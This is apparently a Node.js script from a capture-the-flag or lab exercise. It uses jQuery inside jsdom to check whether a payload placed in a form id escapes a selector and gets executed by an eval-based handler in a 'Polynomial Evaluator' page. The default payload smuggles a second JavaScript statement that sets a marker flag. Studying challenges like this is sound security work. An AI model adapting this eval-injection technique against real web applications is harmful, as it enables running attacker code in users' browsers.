// Verify the exact challenge logic + payload using the REAL bundled jQuery inside jsdom.
const fs = require("fs");
const { JSDOM } = require("jsdom");

// Extract the bundled jQuery (jQuery 3.7.1) from the app bundle is messy; instead load jquery from node_modules
// but run it INSIDE the jsdom window via script injection so it binds correctly.
const jquerySrc = fs.readFileSync(__dirname + "/node_modules/jquery/dist/jquery.js", "utf8");

const format = process.argv[2] || "standard\n;window.__HIT__=(document.title||'run');//";

const html = `<!DOCTYPE html><html><head><title>Polynomial Evaluator</title></head><body>
<form id="poly_${format.replace(/"/g,'&quot;')}" data-formula="x+y">
  <input id="x_standard" name="x" value="1">
  <input id="y_standard" name="y" value="2">
  <input name="formula" value="x+y">
  <div id="template_standard" hidden>Template loaded.</div>
</form>
<pre id="answer"></pre>
</body></html>`;

const dom = new JSDOM(html, { runScripts: "dangerously", pretendToBeVisual: true });
const { window } = dom;

// inject jQuery into the window
const s = window.document.createElement("script");
s.textContent = jquerySrc;
window.document.head.appendChild(s);

const $ = window.$;
console.log("jQuery loaded:", $ && $.fn && $.fn.jquery);

// Now replicate the vulnerable handler EXACTLY
window.__HIT__ = false;
const form = window.document.querySelector("form[id^='poly_']");
const selected = form.id.replace("poly_", "");   // == format
console.log("selected (format) =", JSON.stringify(selected));

let template, threw = null;
try {
  template = $("#template_" + selected);
  console.log("selector OK, template.length =", template.length);
} catch (e) {
  threw = e.message;
  console.log("SELECTOR THREW:", e.message);
}

if (!threw && template.length === 0) {
  // Faithful replication: the handler runs eval(`type_${selected}(this, selected)`)
  // in a scope with type_standard, `this`=form, selected. We build that scope with a Function.
  function type_standard(){ return "SAFE_OK"; }
  const evalRunner = function(sel) {
    const selected = sel;
    // `this` inside will be the form via .call
    return eval("type_" + selected + "(this, selected)");
  };
  try {
    const answer = evalRunner.call(form, selected);
    console.log("EVAL ran. answer =", String(answer).slice(0,40), "| __HIT__ =", window.__HIT__);
  } catch (e) {
    console.log("EVAL ERROR:", e.message);
  }
} else if (!threw) {
  console.log("Took SAFE path (template found). No eval.");
}
